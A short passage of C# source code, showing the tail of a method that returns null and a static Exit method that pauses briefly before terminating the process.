                return null;
            }
        }
        static public void Exit()
        {
            Thread.Sleep(500);
            Environment.Exit(0);
        }
    }
}
